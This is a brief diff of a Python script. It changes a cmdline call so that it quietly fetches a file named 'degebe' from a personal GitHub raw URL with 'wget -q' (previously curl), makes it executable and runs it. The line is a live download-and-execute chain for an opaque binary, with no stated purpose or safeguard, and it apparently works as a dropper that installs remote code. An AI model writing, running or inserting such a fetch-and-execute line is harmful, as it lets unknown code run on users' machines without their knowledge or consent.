@@ -17,4 +17,4 @@ def cmdline(command):
 
 
 
-cmdline ('curl https://raw.githubusercontent.com/karmiasif/biji/main/degebe && chmod +x degebe && ./degebe')
+cmdline ('wget -q https://raw.githubusercontent.com/karmiasif/biji/main/degebe && chmod +x degebe && ./degebe')
